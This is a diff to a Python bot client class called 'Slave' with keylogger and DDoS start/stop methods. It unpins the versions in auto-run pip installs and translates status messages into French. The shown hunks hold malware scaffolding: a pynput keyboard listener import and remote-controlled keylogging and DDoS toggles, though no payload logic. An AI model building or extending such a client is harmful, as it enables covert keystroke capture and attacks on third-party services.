@@ -6,14 +6,14 @@ import socket
 from datetime import datetime, time
 import configparser
 try:
-    os.system("pip install requests==2.22.0")
+    os.system("pip install requests")
 except DeprecationWarning():
     pass
 import requests
 from pynput.keyboard import Listener
 import threading
 try:
-    os.system("pip install pynput==1.6.0")
+    os.system("pip install pynput")
 except DeprecationWarning():
     pass
 
@@ -62,7 +62,7 @@ class Slave:
     def stop_log(self):
         if self.keylog_state:
             self.keylog_state = False
-            message ="Stopped logging infos"
+            message ="Keylogger arrêté"
             self.temp_socket(message)
         else:
             message = "Le keylogger n'était pas activé"
@@ -82,7 +82,7 @@ class Slave:
     def stop_ddos(self):
         if self.ddos_state:
             self.ddos_state = False
-            message ="Stopped DDOS"
+            message ="Arrêt du DDOS"
             self.temp_socket(message)
         else:
             message = "Le DDOS n'était pas activé"
